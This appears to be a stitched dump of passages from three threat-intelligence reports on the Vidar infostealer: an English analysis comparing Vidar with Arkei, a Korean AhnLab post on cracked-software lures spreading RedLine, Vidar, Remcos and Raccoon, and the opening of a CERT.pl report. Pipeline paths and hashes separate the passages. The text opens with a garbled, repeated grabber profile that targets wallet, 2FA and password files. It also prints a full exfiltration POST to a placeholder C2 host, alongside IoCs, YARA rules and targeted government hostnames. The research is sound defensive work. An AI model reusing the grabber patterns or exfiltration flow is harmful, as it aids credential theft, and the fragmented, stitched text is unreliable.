:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



ut

1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc*"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|415a97c0412d4c3780fc2d4d94039391
".dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc*

There are also some possibilities to see multiple profiles executed at the same time. 1,1,1,1,1,1,0,1,1,1,250, DESKTOP;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*2fa*.png:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*. *:*cr DOCUMENTS;%DOCUMENTS%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*. * DRIVE_REMOVABLE;%DRIVE_REMOVABLE%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*. *:*UTC*

they are in fact Delimited with the specific format, as detailed as above. So here, we have 3 profiles : DESKTOP DOCUMENTS DRIVE_REMOVABLE that will be stored into there respectively archives into “files” repository. e.d: All dumped profiles are available on my GitHub repository. Finally, with this quick analysis of the panel, something that is more and more common nowadays with a stealer, a loader feature, for pushing other malware.

28/38

As mentioned in the introduction, this is a shop where customers will just have to deal to configure their malware, everything is managed by a team (?) behind for the maintenance and for avoiding proxy filtering stuff, domains are changed regularly (it’s also easy to check this on the samples, because it looks like a new version means a new generated domain)."|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|8a58badcfe064880ba66a717dffcab89
"Also, there is some possibility (of what they said) to have a 2FA Authentication to their account page.

Some fancy message if we are searching for some stuff with the login panel, with have some sympathetic message.

Let’s see what we have behind

🙂

29/38

A kind of easter egg to remind us what is the signification of Vidar: “the God of Vengeance” in Nordic mythology.

Vidar – An Arkei copycat? If we are looking to requests and code, Vidar is almost identical to Arkei. There is slightly some differences at some point but all implemented features are the same. This could lose some blue team people if they don’t make too much attention to it on sandbox results. Current Yara rules will trigger Vidar as Arkei, so automated assignations lead to mistakes at the moment of this review. Analyzing the code is mandatory here to understand what’s goin’ on. At first, the main function for both of them is similar :

30/38

The archive generation is also the same, so this is not with this information that it’s possible to differentiate these two malware.

Code differences An easy to know if we are dealing with Vidar is to find “Vidar.cpp”.

Vidar Signature

31/38

Arkei signature"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|48138b0dbf9441a58fdec8907e4fa10e
"Code differences An easy to know if we are dealing with Vidar is to find “Vidar.cpp”.

Vidar Signature

31/38

Arkei signature

Network differences An analyst can be dupe easily with the requests and thinking that we have another form of HTTP requests with Arkei, but it’s not. Vidar HTTP Requests / (i.e 162) <- Config ip-api.com/line/ <- Get Network Info /msvcp140.dll <- Required DLL /nss3.dll <- Required DLL /softokn3.dll <- Required DLL /vcruntime140.dll <- Required DLL / <- Pushing Victim Archive to C2

there are no libraries downloaded on Arkei, this is something really specific to Vidar, for some parts of the stealing process. Arkei HTTP Requests /index.php ip-api.com/line/ /index.php

<- Config <- Get Network Info <- Pushing Victim Archive to C2

Config Format

32/38

If you want to understand what is the purpose the config format for Arkei 1

Saved Passwords

1

Cookies / Autofill

1

History

2

CryptoCurrency

2

Skype

2

Steam

1

Telegram

1

Screenshot

1

Grabber

txt:log:

Grabber Config

50

Max Size (kb)

2

Self Delete"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|e3f5eeb60b3c4478af21362b52607d21
"History

2

CryptoCurrency

2

Skype

2

Steam

1

Telegram

1

Screenshot

1

Grabber

txt:log:

Grabber Config

50

Max Size (kb)

2

Self Delete

Also, there are some slight changes in the last POST requests, Vidar is just adding new fields like the profile and the versioning. To understand how far the requests looks the same, let’s dig into a PCAP file. I indicated the differences in red, and apart from the versioning and profile values, all rest is the same. But if we dig into some older sample, it’s impossible to see the differences except the path of the request. Last POST request – Vidar

33/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|265f4ce42fe8420aa178a4ed368509e4
"33/38

POST / HTTP/1.1 Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1 Accept-Language: ru-RU,ru;q=0.9,en;q=0.8 Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1 Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0 Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A Content-Length: 66809 Host: some.lovely.vidar.c2.with.love Connection: Keep-Alive Cache-Control: no-cache --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""hwid"" 90059c37-1320-41a4-b58d-2b75a9850d2f --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""os"" Windows 7 Professional --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""platform"" x86 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""profile"" XXX <- Random Int --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""user"" admin --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""cccount"" 0 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""ccount"" 0 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""fcount"" 0 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""telegram"" 0 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""ver"" 4.1 --1BEF0A57BE110FD467A Content-Disposition: form-data; name=""logs""; filename=""COUNTRY_.zip"" Content-Type: zip"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|dee8080ad50f449c88a3324ac7e18e70
"Features differences When we dig into the different features, there is some config part on Vidar that is in fact just some placebo options. in an example, the Steam stealing feature is implemented in Arkei is not found in Vidar. This is also the same thing with Skype but in contrary 2FA stealing stuff is only on Vidar (with what I have seen on samples in my possession).

Strings only present in Arkei and not in the Vidar that I analyzed

Is Arkei still active and maintained? On one of the selling page of this stealer, it’s still sold and continue to be updated. For example, it reveals that soon a final update on it will be pushed (v10). So let’s see how this will turn.

34/38

The Vidar Cracked Version There is also in the wild a cracked version that was already spotted by some people on twitter. This Vidar or “Anti-Vidar” as called in the source code of the panel and It’s based on an early Vidar build (v2.3 it seems). Login The login is identical to the Android Lokibot panel (thanks to @siri_urz). As always when confronted at this kind of stuff, the code never lies (or it seems) for helping us to identify what is the real C2/Malware.

Profile code The profile is far more simple than the nowadays panels and samples, the default profile is hardcoded on the PHP file, and will get it if the value is 11.

IoCs

SHA256 Hashes

3A20466CC8C07638B8882CCC9B14C08F605F700F03D388CF85B2E76C51D64D65

0E982A02D754588D4EE99F30084B886B665FF04A1460D45C4FD410B04B10A8AF"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|870558a771664c4481898cd14328ab99
"SHA256 Hashes

3A20466CC8C07638B8882CCC9B14C08F605F700F03D388CF85B2E76C51D64D65

0E982A02D754588D4EE99F30084B886B665FF04A1460D45C4FD410B04B10A8AF

2679FA8E9FD0C1F6F26527D53759BB596FDA43A741B4DFCC99A8C0907836A835

9EC586B07961E0C93C830DD1C47598FE21277432F11809A4B73DF7370CDD2E29

42C6950CA57D8805C217E3334158DAB4CC71A50C94D77F608B1C442BFD2B01CA

D71F81EDF8AC04639D3B7C80AA178DF95C2CBFE73F81E931448A475FB771267A

DAD5FCEAB002791DD6FD575782C173F1A39E0E7CE36E6DE1BAEFA95D0A8FB889

66162E69CA30A75E0DD1A6FBB9028FCFBE67B4ADE8E844E7C9FF2DCB46D993D8

EFF272B93FAA1C8C403EA579574F8675AB127C63ED21DB3900F8AB4FE4EC6DA9

EDBAC320C42DE77C184D30A69E119D27AE3CA7D368F802D2F8F1DA3B8D01D6DD

B1D5B79D13F95A516ABBCC486841C8659984E5135F1D9C74343DCCD4390C3475

543AEE5A5435C77A8DE01433079F6381ADB4110F5EF4350E9A1A56B98FE40292

35/38

65B2BD17E452409397E2BD6F8E95FE8B708347D80074861698E4683BD12437A9 47E89F2C76D018D4952D421C5F1D603716B10E1712266DA32F63082F042F9C46 5D37323DA22C5414F6E03E06EFD184D7837D598C5E395E83C1BF248A7DE57155 5C0AF9C605AFD72BEF7CE8184BCCC9578EDB3A17498ACEBB74D02EB4AF0A6D2E 65287763245FDD8B56BB72298C78FEA62405BD35794A06AFBBE23CC5D38BE90A 20E92C2BF75C473B745617932F8DC0F8051BFC2F91BB938B2CC1CD808EBBC675 C752B68F3694B2FAAB117BCBA36C156514047B75151BBBFE62764C85CEF8ADE5 AE2EBF5B5813F92B0F7D6FCBADFA6E340646E4A776163AE86905E735A4B895A0 8F73E9C44C86D2BBADC545CED244F38472C5AACE0F75F57C8FC2398CE0A7F5A1 thx @benkow_ for the help to find some samples

🙂

Domains

malansio.com

nasalietco.com"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|f218e2d41b5e4cb09943ecd8db47284b
"🙂

Domains

malansio.com

nasalietco.com

binacoirel.com

newagenias.com

bokolavrstos.com

naicrose.com

benderio.com

cool3dmods.com

MITRE ATT&CK Yara Rules Vidar rule Vidar_Stealer : Vidar { meta: description = ""Yara rule for detecting Vidar stealer"" author = ""Fumik0_"" strings: $mz = { 4D 5A } $s1 = { 56 69 64 61 72 } $s2 = { 31 42 45 46 30 41 35 37 42 45 31 31 30 46 44 34 36 37 41 } condition: $mz at 0 and ( (all of ($s*)) ) } rule Vidar_Early : Vidar { meta: description = ""Yara rule for detecting Vidar stealer - Early versions"" author = ""Fumik0_"" strings: $mz = { 4D 5A } $s1 = { 56 69 64 61 72 } $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 } condition: $mz at 0 and all of ($hx*) and not $s1 } rule AntiVidar : Vidar { meta: description = ""Yara rule for detecting Anti Vidar - Vidar Cracked Version"" author = ""Fumik0_"" strings: $mz = { 4D 5A } $s1 = { 56 69 64 61 72 } $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 } $hx2 = { 78 61 6B 66 6F 72 2E 6E 65 74 00 } condition: $mz at 0 and all of ($hx*) and not $s1 }

Arkei

36/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|cba1efc0ba1f49d9a4b0de7d1f46f681
"Arkei

36/38

rule Arkei : Arkei rule Arkei : Arkei { meta: Author = ""Fumik0_"" Description = ""Rule to detect Arkei"" Date = ""2018/12/11"" strings: $mz = { 4D 5A } $s1 = ""Arkei"" wide ascii $s2 = ""/server/gate"" wide ascii $s3 = ""/server/grubConfig"" wide ascii $s4 = ""\\files\\"" wide ascii $s5 = ""SQLite"" wide ascii $x1 = ""/c taskkill /im"" wide ascii $x2 = ""screenshot.jpg"" wide ascii $x3 = ""files\\passwords.txt"" wide ascii $x4 = ""http://ip-api.com/line/"" wide ascii $x5 = ""[Hardware]"" wide ascii $x6 = ""[Network]"" wide ascii $x7 = ""[Processes]"" wide ascii $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }

condition: $mz at 0 and ( (all of ($s*)) or ((all of ($x*)) and not $hx1)) }"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b5a7e4bc914540bab56798e51a63d272
"condition: $mz at 0 and ( (all of ($s*)) or ((all of ($x*)) and not $hx1)) }

Github Recommendations This is, as usual, the same thing that I said about my precedent blog post. Always running stuff inside a VM, be sure to install a lot of stuff linked to the hypervisor (like Guest Addons tools) to trigger as much as possible all kind of possible Anti-VM detection and closing malware. When you have done with your activities stop the VM and restore it with a Specific clean snapshot. Avoid storing files at a pre-destined path (Desktop, Documents, Downloads), put at a place that is not common. Don’t be stupid to click on cracks on youtube, hack software for popular games, or “wonderful” easy cash money (like Free Bitcoin Program /facepalm). Flush your browser after each visit, never saved your passwords directly on your browser or using auto-fill features. Don’t use the same password for all your websites (use 2FA and it’s possible)."|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b6665f29f6654c5c8003f29e79c51d25
"Conclusion This analysis was a kind of a mystery game. It’s hard to understand if Vidar is an evolution of Arkei or a forked malware based on his code. As far it seems this is currently an active one and growing up. A lot of updates are pushed on it regularly probably due because this is a young (forked/copycat) malware. With the fact, that this stealer was also using the skin theme of Android Lokibot (due to the cracked version), this could really lose some minds for identifying what is the correct name of the C2, without any samples to analyze. For now, let’s see with the time if we will more answers to put the puzzle together for this stealer. ¯\_(ツ)_/¯ On my side, if I could sum up this year. I have done way more things than I could imagine because 2018 was a really “reaaalllyyyy” thought year, with a lot of problems and huge issues. Let’s see how this next year will be. But now, it’s time to rest and eat because there were so many sleep hours destroy and skip meals this year for learning stuff. Special thanks to my buddies (they will know who they are), you are the best <3

37/38

#HappyHunting

#SeeYouIn2019

38/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|521574c87dcb46c2adec8b3a7076c601
"S/W 다운로드 위장, 다양한 종류의 악성코드 유포 asec.ahnlab.com/ko/25837/ 2021년 8월 4일

ASEC 분석팀에서는 기존 다수의 블로그 포스팅을 통해 상용 소프트웨어의 Crack, Serial 등 의 키워드로 검색되는 악성 사이트로부터 유포되는 CryptBot 악성코드에 대하여 언급하며 사 용자의 주의를 당부하였다.

피싱 사이트를 통해 유포되는 CryptBot 정보탈취 악성코드 – ASEC BLOG 1/12

ASEC 분석팀은 유틸리티 프로그램으로 위장하여 정보탈취 악성코드를 유포하는 피싱 사이 트를 아래 블로그를 통해 소개한 바 있다. 해당 악성코드는 구글 검색 키워드로 유틸리티 프로 그램 이름을 검색할 시 사용자에게 비교적 상단에 노출된다. 현재까지도 활발히 유포되고 있 으며, 감염 과정은 지속해서 변화되고 있다. 해외에서 CryptBot 으로 알려진 해당 정보 탈취 악 성코드의 최근 유포 파일의 감염 방식에 관해 설명한다. [그림 1], [그림 2]는 유틸리티 프로그 램으로 위장하여 악성코드를 유포하는 피싱 사이트의 모습이다. 영문 사이트 …

지속적으로 변형되며 유포 중인 CryptBot 정보탈취 악성코드 – ASEC BLOG CryptBot 악성코드는 S/W 다운로드 페이지를 위장한 악성 사이트에서 유포 중인 정보탈취 유 형의 악성코드이다. 다수의 악성 사이트가 개설되어 있으며, 유명 상용 소프트웨어의 Crack, Serial 등의 키워드 검색 시 검색 결과 상위에 다수 노출되기 때문에 많은 사용자가 해당 악성 코드를 다운로드하여 실행한다. 또한 해당 샘플은 SFX 방식의 패킹을 사용하기 때문에 정상 과 악성의 구분이 쉽지 않은 편이며, 하루에도 몇 번씩 잦은 변형이 발생한다. 다운로드 페이지 로 위장하였기 때문에 사용자는 정상 파일로 오인하여 V3 제품에서 … 이러한 악성 사이트로부터 유포되는 악성코드는 CryptBot 악성코드가 대다수이지만, 간혹 타 악성코드가 유포되곤 한다. 본 블로그에서는 동일 유형의 악성코드 유포 중 CryptBot을 제외 한 타 악성코드에 대하여 언급하고자 한다. 기존의 블로그에서도 언급했듯이 해당 악성코드는 검색엔진에 특정 상용 소프트웨어의 Crack, Serial, Keygen, License 등의 불법적인 키워드를 검색할 경우 상위에 노출되는 악성 페이지로부터 유포된다. 해당 악성 페이지는 대표적으로 다음과 같으며 정상 툴을 다운로드 받을 수 있을 것처럼 꾸며 놓았지만, 실제로 다운로드되는 파일은 악성코드가 담긴 압축 파일이다. 자세한 내용은 다음 블로그에 상세히 기술되어 있다.

2/12

그림1. 악성코드 유포 사이트 예시"|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|a41aef99c95d4aff96736aeb57fa9704
"2/12

그림1. 악성코드 유포 사이트 예시

다른 외형으로 유포 중인 CryptBot 정보탈취 악성코드 – ASEC BLOG CryptBot 악성코드는 유틸리티 다운로드 페이지를 위장한 악성 사이트를 통해 유포되는 정보 탈취형 악성코드다. 특정 프로그램, 크랙, 시리얼 등의 키워드를 검색 시 관련 유포지가 상단에 노출되며, 해당 페이지에 접속하여 다운로드 버튼을 누를 경우 CryptBot 악성코드 다운로드 페이지로 리디렉트 된다. 악성 사이트는 다양한 키워드로 매우 많은 수량이 개설되어 있다. 대 부분의 유명 소프트웨어 키워드를 검색 시 다수의 악성 사이트가 상위 페이지에 노출되며, 관 련 파일 탐지 수량 또한 상당하다. 웹 서핑 중 아래와 같은 페이지를 마주… 이러한 악성 사이트에서 유포 중인 악성코드는 크게 두가지 유형으로 나뉜다. NSIS 드로퍼 유형과 Autoit Loader 유형이다. 전자는 실행 시 다수의 악성코드를 동시에 드롭하여 실행한다. 드롭 과정에서 AV 제품의 진단 이 발생할 경우 실행이 불가능하여 본 블로그에서는 다루지 않았지만, 어떠한 경우에서 실행 되었다면 복구 불가능할 정도로 다수의 악성코드에 감염된다. 보통 10개 정도의 악성코드를 드롭 후 실행하며, 이 중 다운로더형 악성코드도 다수 포함되어 있기 때문에 실제 감염되는 악 성코드는 더 많게 된다. 해당 드로퍼로 인해 감염되는 악성코드는 대표적으로 다음과 같다. 3/12

BeamWinHTTP, SmokeLoader, RedLine, YAHOOYLO, Socelars Stealer, ClipBanker, Backstage Stealer, Androm 외 다수 해당 유형의 특징은 최종 압축 해제한 실행파일의 아이콘이 NSIS 기본 아이콘이며, 그 내부 파일은 “setup_installer.exe”이름을 가진 7zSFX 실행파일인 점이다. 실행 시 특정 디렉토리에 내부 파일들을 압축 해제 후 “setup_install.exe” 파일을 실행하는데, 동일 디렉토리에 생성된 txt 파일을 실행하는 역할을 한다. 내부에 존재하는 다수의 txt 파일은 텍스트 파일로 위장한 악성코드 파일이다. 별도의 인코딩 이나 암호화를 거치지 않았기 때문에 압축 해제 즉시 V3 제품에 의해 탐지되어 차단된다."|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|867cfee974364a7db9a2472ae649bbbf
"그림2. NSIS Dropper 악성코드 실행 구조 Dropper/Win.MulDrop. * Dropper/Win.MuDrop. * 후자의 경우는 실행 시 Autoit 관련 파일을 생성 후 실행하는 유형이다. 기존 블로그에서 언급 했던 CryptBot의 경우가 해당 유형에 속한다. CryptBot을 주로 유포하는 점에서 자사에서는 해 당 패킹 유형을 “CryptLoader” 진단명으로 대응 중이다. 대부분의 경우에는 CryptBot 악성코드 를 유포하고, CryptBot은 Clipbanker를 다운로드하여 실행하지만, 간혹 타 악성코드가 유포되 곤 한다. 최근 약 한 달간 해당 유형으로 유포된 악성코드 중 CryptBot을 제외한 악성코드는 다음과 같 다. 다음 샘플들은 악성 페이지로부터 직접 다운로드 되거나 CryptBot, NSIS Dropper 등 해당 공격 유형의 샘플에 의하여 추가 생성된 악성코드이다.

1. RedLine RedLine 악성코드는 .NET 언어로 빌드된 악성코드로 각종 사용자 정보를 탈취하여 C2로 전 송한 후 추가 악성코드를 다운로드 실행 및 자가삭제 행위가 가능하다. 행위적으로는 CryptBot 악성코드와 유사하지만 기능은 훨씬 다양하며 약 100KB의 비교적 적은 용량을 가진 4/12

다. 실행 시 오토잇 스크립트 내부 쉘 코드에 의해 RegAsm.exe 프로세스를 실행 후 해당 프로세 스에 할로잉되어 동작한다.

그림3.

RedLine 악성코드 프로세스 트리 실제로는 RegAsm.exe에 할로잉되어 동작하지만 내부 바이너리를 추출해보면 다음과 같이 유효 인증서가 존재하며, 타 .NET 악성코드와는 다르게 난독화가 거의 되어있지 않은 형태이 다.

그림4. 서명 정보

그림5. 내부 메소드 목록

5/12

각종 브라우저에 저장된 계정 및 패스워드, 암호화폐 지갑 파일, Discord 등의 메신저 토큰, FTP 클라이언트 정보, VPN 정보 등 다양한 주요 정보가 탈취 대상이 되며 과거에는 아래 블로 그와 같이 Youtube를 통해 유포된 이력이 있다.

유튜브를 통해 유포 중인 RedLine 인포스틸러 – ASEC BLOG ASEC 분석팀은 최근 RedLine 인포스틸러 악성코드가 크랙 프로그램 다운로드 링크로 위장 한 유튜브 사이트를 통해 유포 중인 것을 확인하였다. RedLine은 정보 유출 악성코드로서 웹 브라우저 및 FTP 클라이언트 프로그램에 저장되어 있는 사용자 계정 정보나 스크린샷, 코인 지갑 주소 등 사용자 정보를 C&C 서버에 유출하는 기능을 갖는다. RedLine 악성코드가 최초 로 확인된 것은 2020년 3월경으로 코로나 바이러스 이슈를 이용한 스팸 메일을 통해 유포된 것이 첫번째 사례이다. 이후부터 꾸준히 다양한 경로를 통해 유포되고… C2: gimpimageeditor.com

2. Vidar Vidar 악성코드 또한 정보 탈취 목적의 악성코드이다. 본 샘플의 경우 nslookup.exe를 실행 후 프로세스 할로잉하여 동작한다.

그림6. Vidar 악성"|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|f348d2b19015414dbc08d0c6e8b53ff3
"2. Vidar Vidar 악성코드 또한 정보 탈취 목적의 악성코드이다. 본 샘플의 경우 nslookup.exe를 실행 후 프로세스 할로잉하여 동작한다.

그림6. Vidar 악성

코드 프로세스 트리

6/12

내부에서 추출 가능한 원본 바이너리의 WinMain 함수에서는 다음과 같이 안티 디스어셈블 기 능을 하는 가비지 코드가 포함되어 있으며, 이를 제거해야 정상적으로 디스어셈블이 가능하 다. 안티 디스어셈블의 경우 대표적인 분석 방해 기법 중 하나이다.

그림7. 안

티 디스어셈블 코드 Vidar 악성코드는 정보 수집 행위 전에 C2에 접속하여 행위에 필요한 다양한 라이브러리를 다 운로드 받는 것이 특징이며 해당 C2 주소를 구하기 위해 공격자가 개설해 놓은 텀블러 주소로 접속을 시도한다. 해당 텀블러에 접속할 경우 다음 그림과 같이 내부 소스코드에 Vidar의 실제 C2 주소가 명시되어 있다.

그림8.

공격자 텀블러 페이지 과거 Faceit 등의 게임 플렛폼을 이용하여 C2 정보를 업데이트하는 Vidar 악성코드에 대한 정 보를 ASEC블로그를 통해 포스팅한 바 있다. 이처럼 공격자는 C2를 업데이트하기 위해 정상 도메인을 활용하는 사례가 잦아지고 있다.

특정 게임 플랫폼을 악용한 Vidar 인포스틸러 – ASEC BLOG ASEC 분석팀에서는 최근 Vidar 인포스틸러 악성코드가 Faceit이라는 게임 매칭 프로그램을 악용하여 C&C 서버 주소를 구하는 것을 확인하였다. Vidar는 스팸 메일이나, PUP 그리고 7/12

KMSAuto 인증 툴을 위장하여 설치되는 등 과거부터 꾸준히 유포되고 있는 악성코드이다. (본 블로그 하단의 이전 블로그 링크 참고) Vidar는 정보 탈취 행위를 수행하기 이전에 C&C 서버 에 접속하여 명령을 전달받고, 추가적으로 여러 DLL들을 다운로드 받아 사용자의 정보들을 수 집한다. 과거에는 일반적인 악성코드들과 같이 단순히 C&C… 탈취한 정보를 압축하여 C2로 전송하며 C2의 명령에 따라 다양한 추가적인 악성 행위가 가능 하다. C2: shpak125.tumblr.com / 116.202.183.50

3. Remcos Remcos 악성코드는 RAT 유형의 악성코드로 키로깅을 포함한 다양한 사용자 정보를 수집 및 유출하며, 다양한 공격자의 명령을 수행할 수 있다. 원격 관리를 위한 도구로 제작자의 웹 페이 지에서 판매되고 있지만 대부분 악성코드로 악용되는 경우가 많다."|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|def4b12a710246c187a944d9a04030da
"스팸 메일로 유포 중인 Remcos RAT 악성코드 – ASEC BLOG Remcos는 RAT(Remote Administration Tool) 악성코드로서 수년 전부터 스팸 메일을 통해 꾸 준히 유포되고 있다. Remcos는 제작자가 아래와 같은 웹 사이트를 통해 원격 관리를 위한 RAT 도구로 설명하면서 판매하고 있으며 최신까지도 주기적으로 업데이트 되고 있다. Remcos 홈페이지에서 설명하는 기능들만 본다면 원격 지원을 위한 목적으로 또는 도난 시 민 감한 데이터를 삭제하거나 추적하는 목적으로도 사용 가능하다고 적혀져 있다. 물론 이러한 기능들이 지원되는 것은 사실이다. 하지만 키로깅, 스크린샷 캡쳐… 본 샘플에서는 vidar의 경우와 마찬가지로 nslookup.exe를 실행 후 할로잉하여 동작한다.

8/12

그림9. Remcos 악성

코드 프로세스 트리 실행 시 “Remcos_Mutex_Inj” 뮤텍스를 생성한다.

그림10. 뮤텍스 생성 코드

권한 상승, 키로깅, 각종 정보 탈취, 웹캠 및 마이크 녹음, 클립보드 탈취, 실시간 스크린 전송 및 원격 제어 등의 다양한 악성 행위가 가능하다.

그림11. 권한 상승 코

드 본 샘플에서 사용된 Remcos의 버전은 “3.2.0 Pro” 이다. 버전과 관련된 문자열은 rdata 영역에 하드코딩 되어있으며, 해당 버전은 2021.07.30 일자로 릴리즈된 최신 버전이다.

그림12. Remcos 버전 정보

최근 유포된 Remcos 샘플 중에서는 내부 파일이 추가적인 패킹이 되어있는 경우도 확인되었 다. UPX와 Mpress등의 패커로 포장된 악성코드가 정상 프로세스에 할로잉된다. 공격자는 탐 지 우회를 위해 여러 테스트를 거친 것으로 판단된다.

9/12

그림13. 원본 샘플, UPX 패킹 샘플, Mpress 패킹 샘플 C2: 146.0.72.170:9094

4. Raccoon Stealer 최근 유포된 Raccoon Stealer의 경우 MalPE 유형의 패커를 사용하여 유포되었다. 과거 Autoit Loader 유형이 아닌 MalPE 유형의 유포에 관련된 내용을 포스팅하였다. 이후로도 종종 MalPE 유형의 악성코드가 유포되었으며 해당 유형은 이메일, 익스플로잇킷 등을 통한 유포에 서도 활발하게 사용되는 패킹 유형이다.

다른 외형으로 유포 중인 CryptBot 정보탈취 악성코드 – ASEC BLOG CryptBot 악성코드는 유틸리티 다운로드 페이지를 위장한 악성 사이트를 통해 유포되는 정보 탈취형 악성코드다. 특정 프로그램, 크랙, 시리얼 등의 키워드를 검색 시 관련 유포지가 상단에 노출되며, 해당 페이지에 접속하여 다운로드 버튼을 누를 경우 CryptBot 악성코드 다운로드 10/12"|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|36f74b9139c14358867608405b98b87d
"페이지로 리디렉트 된다. 악성 사이트는 다양한 키워드로 매우 많은 수량이 개설되어 있다. 대 부분의 유명 소프트웨어 키워드를 검색 시 다수의 악성 사이트가 상위 페이지에 노출되며, 관 련 파일 탐지 수량 또한 상당하다. 웹 서핑 중 아래와 같은 페이지를 마주… 해당 패킹 유형은 다음과 같이 한 파일 안에 여러 아이콘이 존재하며 리소스 영역에에 랜덤 문 자열을 담고 있는 특징이 있다.

그림14. 샘플 내부 리소스의 아이콘 Raccoon Stealer 악성코드 또한 정보 탈취 유형의 악성코드 이며 실제 C2 주소를 얻기 위해 공격자의 텔레그램 주소로 접속 시도한다. 해당 페이지에는 다음과 같이 암호화된 문자열이 명시되어 있으며 해당 문자열을 복호화하여 C2 주소를 구한다.

그림15. 공격자 텀블러 페이지 공격자 텀블러 페이지에 명시된 문자열의 앞뒤를 규격에 맞게 잘라 Base64 디코딩 후 RC4 알 고리즘을 사용하여 복호화한다. RC4에 대한 키값은 샘플 파일의 rdata 영역에 하드코딩 되어 있다. 이러한 방식으로 공격자는 이미 유포된 샘플의 C2를 지속적으로 변경 가능하다.

그림

16. RC4 복호화 키

그림17.

복호화 결과

11/12

C2: telete.in/inosradioworld / 5.181.156.60 위에서 열거한 악성코드 이외에도 랜섬웨어 등 정보탈취 유형이 아닌 악성코드가 유포된 이력 또한 확인된다. 이처럼 공격자는 다양한 악성코드를 유포하며 그 효과를 테스트 중인 것으로 추정된다. 앞으로도 언제든지 타 악성코드 유포가 가능한 만큼 사용자의 주의가 필요하며 신 뢰할 수 없는 페이지로부터 다운로드된 파일은 실행해서는 안된다. [IOC 정보] a5bc136c227ab70ed77e3bebe6e4bc6d 21be2e389bc3d34f6a20dad828aa80b2 2349e8337b649af297fe9ef6b99deae5 8680a71a54f5eb063aedc7d8922e031c gimpimageeditor.com shpak125.tumblr.com 116.202.183.50 146.0.72.170:9094 telete.in/inosradioworld 5.181.156.60

연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구 독 서비스를 통해 확인 가능하다.

Categories:악성코드 정보

12/12"|data_input/vidar_reports/entry_deb052b8-0993-4801-8cdf-727e85d3151f.text|96ce909e05954a1f8aa934029efb1128
"Vidar stealer campaign targeting Baltic region and NATO entities cert.pl/en/posts/2021/10/vidar-campaign/

While working on our automatic configuration extractors, we came across a rather strangelooking Vidar sample. The decrypted strings included domain names of such organizations as the NATO Strategic Communications Centre of Excellence, Border Guard of Poland, Estonia and Latvia, and Ministry of the Interior of Lithuania.

1/10

Automatically extracted strings from a Vidar sample List of targeted hostnames: ccdcoe.ee ccdcoe.org stratcomcoe.org enseccoe.org sab.gov.lv midd.gov.lv dp.gov.lv rs.gov.lv vp.gov.lv mod.gov.lv cert.lv mil.lv gov.lt mil.lt vsd.lt vrm.lt stt.lt kapo.ee politsei.ee aw.gov.pl abw.gov.pl strazgraniczna.pl bbn.gov.pl sww.gov.pl mon.gov.pl skw.gov.pl cert.pl

2/10

Vidar Stealer During this analyiss we'll be looking at sample b115531ef23c109fb58c392379b7f55eff11169e1317b263da60edd9ac98f6b1 ."|data_input/vidar_reports/entry_aca6ac16-9a47-4416-a66e-d333136a459b.text|ea0cfbc74f3a4d53a011cf89e9a134c2
"2/10

Vidar Stealer During this analyiss we'll be looking at sample b115531ef23c109fb58c392379b7f55eff11169e1317b263da60edd9ac98f6b1 .

